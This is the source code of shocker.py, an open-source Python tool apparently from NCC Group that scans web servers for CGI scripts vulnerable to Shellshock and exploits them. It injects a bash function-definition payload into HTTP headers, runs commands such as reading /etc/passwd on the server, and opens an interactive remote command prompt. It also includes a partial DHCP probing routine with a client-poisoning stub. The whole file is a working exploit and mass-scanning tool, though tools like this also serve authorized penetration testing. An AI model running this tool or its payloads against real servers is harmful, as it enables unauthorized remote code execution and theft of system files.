#!/usr/bin/python

"""
shocker.py v0.8
A tool to find and exploit webservers vulnerable to Shellshock

##############################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/        #
#                                                                            #
# Developed by Tom Watson, tom.watson@nccgroup.com                           #
#                                                                            #
# http://www.github.com/nccgroup/shocker                                     #
#                                                                            #
# Released under the GNU Affero General Public License                       #
# (http://www.gnu.org/licenses/agpl-3.0.html)                                #
##############################################################################

Usage examples:
./shocker.py -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat 
/etc/passwd

./shocker.py -H www.example.com -p 8001 -s
Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
attempts the default exploit for any found

./shocker.py -f iplist
Scans all hosts specified in the file ./iplist with default options

Read the README for more details
"""

import urllib2
import argparse
import string
import StringIO
import random
import signal
import sys
import socket
import Queue
import threading
import re
from collections import OrderedDict
from scapy.all import *   

# Wrapper object for sys.sdout to (try to) eliminate text buffering
# (http://stackoverflow.com/questions/107705/python-output-buffering)
class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream
    def write(self, data):
        self.stream.write(data)
        self.stream.flush()
    def __getattr__(self, attr):
        return getattr(self.stream, attr)

# Wrap std.out in Unbuffered
sys.stdout = Unbuffered(sys.stdout)


# Dictionary {header:attack string} to try on discovered CGI scripts
# Where attack string comprises exploit + success_flag + command
ATTACKS = [
   "() { %3a;}; echo; "
   ]

# Timeout for attacks which do no provide an interactive response
ATTACK_TIMEOUT = 20

# User-agent to use instead of 'Python-urllib/2.6' or similar
USER_AGENT = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"

# Handle CTRL-c elegently
def signal_handler(signal, frame):
    """ Try to catch and respond to CTRL-Cs
    """

    sys.exit(0)


###################
#
# HTTP/S Attacks
#
###################


def do_http_attack(host_target_list, port, protocol, cgi_list, proxy, header, command, verbose):
    """ The main funtion for http (and https) attacks. Accepts arguments passed in from the
    command line and outputs to the command line.
    """
    # Check hosts resolve and are reachable on the chosen port
    confirmed_hosts = check_hosts(host_target_list, port, verbose)

    # Go through the cgi_list looking for any present on the target host
    if len(confirmed_hosts) > 0:
        target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)
        # If any cgi scripts were found on the target host try to exploit them
        if len(target_list):
            successful_targets = do_exploit_cgi(proxy, target_list, header, command, verbose)
            if len(successful_targets):
                ask_for_console(proxy, successful_targets, verbose)
            else:
                print "[-] All exploit attempts failed"
        else:
            print "[+] No targets found to exploit"
    else:
        print "[-] No valid hosts provided"
def check_hosts(host_target_list, port, verbose):
    """ Do some basic sanity checking on hosts to make sure they resolve
    and are currently reachable on the specified port(s)
    """
    
    counter = 0
    number_of_targets = len (host_target_list)
    confirmed_hosts = [] # List of resoveable and reachable hosts
    if number_of_targets > 1:
        print "[+] Checking connectivity to targets..."
    else:
        print "[+] Checking connectivity with target..."
    for host in host_target_list:
        counter += 1
        # Show a progress bar unless verbose or there is only 1 host 
        if not verbose and number_of_targets > 1: 
            print_progress(number_of_targets, counter) 
        try:
            if verbose: print "[I] Checking to see if %s resolves..." % host
            ipaddr = socket.gethostbyname(host)
            if verbose: print "[I] Resolved ok"
            if verbose: print "[I] Checking to see if %s is reachable on post %s..." % (host, port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((ipaddr, int(port)))
            s.close()
            if verbose: print "[I] %s seems reachable..." % host
            confirmed_hosts.append(host)
        except Exception as e:
            print "[!] Exception - %s: %s" % (host, e)
            print "[!] Omitting %s from target list..." % host
    if number_of_targets > 1:
        print "[+] %i of %i targets were reachable" % \
                            (len(confirmed_hosts), number_of_targets)
    elif len(confirmed_hosts) > 0:
        print "[+] Target was reachable"
    return confirmed_hosts


def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
    """ Checks to see if scripts contained in cgi_list are present (i.e. 
    return a 200 response from the server).
    Go through each potential cgi in cgi_list spinning up a thread for each
    check. Create Request objects for each check. 
    Return a list of cgi which exist and might be vulnerable
    """

    # List of potentially epxloitable URLs 
    exploit_targets = []
    cgi_num = len(cgi_list)
    q = Queue.Queue()
    threads = []
    
    for host in host_target_list:
        print "[+] Looking for vulnerabilities on %s:%s" % (host, port) 
        cgi_index = 0
        for cgi in cgi_list:
            cgi_index += 1

            # Show a progress bar unless verbose or there is only 1 cgi 
            if not verbose and cgi_num > 1: print_progress(cgi_num, cgi_index) 

            try:
                req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
                url = req.get_full_url()
                if proxy:
                    req.set_proxy(proxy, "http")    
                
                # Pretend not to be Python for no particular reason
                req.add_header("User-Agent", USER_AGENT)

                # Set the host header correctly (Python includes :port)
                req.add_header("Host", host)
                
                thread_pool.acquire()
                
                # Start a thread for each CGI in cgi_list
                if verbose: print "[I] Starting thread %i" % cgi_index
                t = threading.Thread(target = do_check_cgi, args = (req, q, verbose))
                t.start()
                threads.append(t)
            except Exception as e: 
                if verbose: print "[I] %s - %s" % (url, e) 
            finally:
                pass

        # Wait for all the threads to finish before moving on    
        for thread in threads:
            thread.join()
   
        # Pop any results from the Queue and add them to the list of potentially 
        # exploitable urls (exploit_targets) before returning that list
        while not q.empty():
            exploit_targets.append(q.get())
    
    if verbose: print "[+] Finished host scan"
    return exploit_targets

def do_check_cgi(req, q, verbose):
    """ Worker thread for scan_hosts to check if url is reachable
    """

    try:
        if urllib2.urlopen(req, None, 5).getcode() == 200:
            q.put(req.get_full_url())
    except Exception as e:
        if verbose: print "[I] %s for %s" % (e, req.get_full_url()) 
    finally:
        thread_pool.release()

def do_exploit_cgi(proxy, target_list, header, command, verbose):
    """ For urls identified as potentially exploitable attempt to exploit
    """

    # Flag used to identify whether the exploit has successfully caused the
    # server to return a useful response
    success_flag = ''.join(
        random.choice(string.ascii_uppercase + string.digits
        ) for _ in range(20))
    
    # A dictionary of apparently successfully exploited targets
    # {index: (url, header, exploit)}
    # Returned to main() 
    successful_targets = OrderedDict()

    counter = 1

    if len(target_list) > 1:
        print "[+] %i potential targets found, attempting exploits..." % len(target_list)
    else:
        print "[+] 1 potential target found, attempting exploit..."
    for target in target_list:
        if verbose: print "[+] Trying exploit for %s" % target 
        if verbose: print "[I] Flag set to: %s" % success_flag
        for exploit in ATTACKS:
            attack = exploit + " echo " + success_flag + "; " + command
            result = do_attack(proxy, target, header, attack, verbose)
            if success_flag in result:
                if verbose: 
                    print "[!] %s looks vulnerable" % target 
                    print "[!] Response returned was:" 
                    buf = StringIO.StringIO(result)
                    if len(result) > (len(success_flag)):
                        for line in buf:
                            if line.strip() != success_flag: 
                                print "  %s" % line.strip()
                    else:
                        print "[!] A result was returned but was empty..."
                        print "[!] Maybe try a different exploit command?"
                    buf.close()
                successful_targets.update({counter: (target, 
                                                     header, 
                                                     exploit)})
		counter += 1
            else:
                if verbose: print "[-] Not vulnerable" 
    return successful_targets


def do_attack(proxy, target, header, attack, verbose):
    result = ""
    host = target.split(":")[1][2:] # substring host from target URL

    try:
        if verbose:
            print "[I] Header is: %s" % header
            print "[I] Attack string is: %s" % attack
        req = urllib2.Request(target)
        # User-Agent is overwritten if it is supplied as the attacker header
        req.add_header("User-Agent", USER_AGENT)
        req.add_header(header, attack)
        if proxy:
            req.set_proxy(proxy, "http")    
            if verbose: print "[I] Proxy set to: %s" % str(proxy)
        req.add_header("Host", host)
        # Times out if no response within ATTACK_TIMEOUT seconds
        resp = urllib2.urlopen(req, None, ATTACK_TIMEOUT)
        result =  resp.read()
    except Exception as e:
        if verbose: print "[I] %s - %s" % (target, e) 
    finally:
        pass
    return result

def ask_for_console(proxy, successful_targets, verbose):
    """ With any discovered vulnerable servers asks user if they
    would like to choose one of these to send further commands to
    in a semi interactive way
    successful_targets is a dictionary:
    {counter, (target, header, exploit)}
    """

    # Initialise to non zero to enter while loop
    user_input = 1
    while user_input is not 0:
        result = ""
        if len(successful_targets) > 1:
            print "[+] The following URLs appear to be exploitable:"
        else:
            print "[+] The following URL appears to be exploitable:"
        for x in range(len(successful_targets)):
            print "  [%i] %s" % (x+1, successful_targets[x+1][0])
        print "[+] Would you like to exploit further?"
        user_input = raw_input("[>] Enter an URL number or 0 to exit: ")
        sys.stdout.flush()
        try:
            user_input = int(user_input)
        except:
            continue
        if user_input not in range(len(successful_targets)+1):
            print "[-] Please enter a number between 1 and %i (0 to exit)" % \
                                                            len(successful_targets)
            continue
        elif not user_input:
            continue
        target = successful_targets[user_input][0]
        header = successful_targets[user_input][1]
	exploit = successful_targets[user_input][2]
        print "[+] Entering interactive mode for %s" % target
        print "[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'"

        while True:
            command = ""
            result = ""
            sys.stdout.flush()
            command = raw_input("  > ")
            sys.stdout.flush()
            if command == "quit":
                sys.stdout.flush()
                print "[+] Exiting interactive mode..."
                sys.stdout.flush()
                break
            if command:
                attack = successful_targets[user_input][2] + command
                result = do_attack(proxy, target, header, attack, verbose)
            else:
                result = ""
            if result: 
                buf = StringIO.StringIO(result)
                for line in buf:
                    sys.stdout.flush()
                    print "  < %s" % line.strip()
                    sys.stdout.flush()
            else:
                sys.stdout.flush()
                print "  > No response"
                sys.stdout.flush()


def validate_address(hostaddress):
    """ Attempt to identify if proposed host address is invalid by matching
    against some very rough regexes """

    singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    FQDN_pattern = re.compile('^(\w+\.)*\w+$')
    if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
        return True 
    else:
        print "Host %s appears invalid, exiting..." % hostaddress
        exit(0)


def get_targets_from_file(file_name):
    """ Import targets to scan from file
    """

    host_target_list = []
    with open(file_name, 'r') as f:
        for line in f:
            line = line.strip()
            if not line.startswith('#') and validate_address(line):
                host_target_list.append(line)
    print "[+] %i hosts imported from %s" % (len(host_target_list), file_name)
    return host_target_list


def import_cgi_list_from_file(file_name):
    """ Import CGIs to scan from file
    """

    cgi_list = []
    with open(file_name, 'r') as f:
        for line in f:
            if not line.startswith('#'):
                cgi_list.append(line.strip())
    print "[+] %i potential targets imported from %s" % (len(cgi_list), file_name)
    return cgi_list


def print_progress(
                total,
                count,
                lbracket = "[",
                rbracket = "]",
                completed = ">",
                incomplete = "-",
                bar_size  = 50
                ): 
    percentage_progress = (100.0/float(total))*float(count)
    bar = int(bar_size * percentage_progress/100)
    print lbracket + completed*bar + incomplete*(bar_size-bar) + rbracket + \
        " (" + str(count).rjust(len(str(total)), " ") + "/" + str(total) + ")\r",
    if percentage_progress == 100: print "\n"


###################
#
# DHCP Attacks
#
###################


def do_dhcp_attack():
    """ The main funtion for DHCP attacks. Accepts arguments passed in from the
    command line and outputs to the command line.
    """
    look_for_dhcp_servers()
    poison_dhcp_clients()


def look_for_dhcp_servers():

    conf.checkIPaddr = False
    fam,hw = get_if_raw_hwaddr(conf.iface)
    randxid = random.randrange(1, 4294967295)
    results = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/
            IP(src="0.0.0.0", dst="255.255.255.255")/
            UDP(sport=68, dport=67)/
            BOOTP(chaddr=hw, xid=randxid)/
            DHCP(options=[
                ("message-type","discover"),
                ("end"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad"),
                ("pad")
                ]),
            verbose=0
            )
    answered, unanswered = results
    answer = answered[0][1]
    print "[!] " + answer.summary()
    print "[+] Server IP: %s" % answer[IP].src
    print "[!] " + str(answer[DHCP].options)
    for option in answer[DHCP].options:
        print "[+] OPTION: " + str(option)
    if answered[0][1][BOOTP].xid==randxid: print "[+] Replied received..."


def poison_dhcp_clients():
    pass

def main():
    print """
   .-. .            .            
  (   )|            |            
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |   
   `-' '  `-`-'  `-''  `-`--''  v0.8 
   
 Tom Watson, tom.watson@nccgroup.com
 http://www.github.com/nccgroup/shocker
     
 Released under the GNU Affero General Public License
 (http://www.gnu.org/licenses/agpl-3.0.html)
    
    """ 
    
    # Handle CTRL-c elegently
    signal.signal(signal.SIGINT, signal_handler)

    # Handle command line argumemts
    parser = argparse.ArgumentParser(
        description='A Shellshock scanner and exploitation tool',
        epilog='Examples of use can be found in the README' 
        )
    parser.add_argument(
        '--Mode',
        '-M',
        choices=['http', 'dhcp'],
        type = str,
        default = "http",
        help = 'Attack mode (default=http)'
        )
    targets = parser.add_mutually_exclusive_group()
    targets.add_argument(
        '--Hostname',
        '-H',
        type = str,
        help = 'A target host'
        )
    targets.add_argument(
        '--file',
	'-f',
        type = str,
        help = 'File containing a list of targets'
        )
    cgis = parser.add_mutually_exclusive_group()
    cgis.add_argument(
        '--cgilist',
        type = str,
        default = './shocker-cgi_list',
        help = 'File containing a list of CGIs to try'
        )
    cgis.add_argument(
        '--cgi',
        '-c',
        type = str,
        help = "Single CGI to check (e.g. /cgi-bin/test.cgi)"
        )
    parser.add_argument(
        '--port',
        '-p',
        default = 80,
        type = int, 
        help = 'The target port number (default=80)'
        )
    parser.add_argument(
        '--command',
        default = "/bin/uname -a",
        help = "Command to execute (default=/bin/uname -a)"
        )
    parser.add_argument(
        '--proxy', 
        help = "*A BIT BROKEN RIGHT NOW* Proxy to be used in the form 'ip:port'"
        )
    parser.add_argument(
        '--ssl',
        '-s',
        action = "store_true", 
        default = False,
        help = "Use SSL (default=False)"
        )
    parser.add_argument(
        '--header',
        default = "Content-type",
        help = "Header to use (default=Content-type)"
        )
    parser.add_argument(
        '--threads',
        '-t',
        type = int,
        default = 10,
        help = "Maximum number of threads (default=10, max=100)"
        )
    parser.add_argument(
        '--verbose',
        '-v',
        action = "store_true", 
        default = False,
        help = "Be verbose in output"
        )
    args = parser.parse_args()

    # Assign options to variables
    if args.Mode == "dhcp":
        print "[+] DHCP ATTACK MODE SELECTED"
        do_dhcp_attack()
    elif args.Mode == "http":
        print "[+] HTTP ATTACK MODE SELECTED"
        if args.Hostname:
            host_target_list = [args.Hostname]
        elif args.file:
            host_target_list = get_targets_from_file(args.file)
        else:
            print "[-] Either a host or a file containing a list of hosts much be provided"
            exit(0)
        if not len(host_target_list) > 0:
            print "[-] No valid targets provided, exiting..."
            exit (0)
        port = str(args.port)
        header = args.header
        if args.proxy is not None:
            proxy = args.proxy
        else:
            proxy = ""
        verbose = args.verbose
        command = args.command
        if args.ssl == True or port == "443":
            protocol = "https"
        else:
            protocol = "http"
        global thread_pool
        if args.threads > 100:
            print "Maximum number of threads is 100"
            exit(0) 
        else:
            thread_pool = threading.BoundedSemaphore(args.threads)
        if args.cgi is not None:
            cgi_list = [args.cgi]
            print "[+] Single target '%s' being used" % cgi_list[0]
        else:
            cgi_list = import_cgi_list_from_file(args.cgilist)
        do_http_attack(host_target_list, port, protocol, cgi_list, proxy, header, command, verbose)
    else:
        print "Unresognised attack type. Exiting..."
        exit(0)

__version__ = '0.8'
if __name__ == '__main__':
    main()
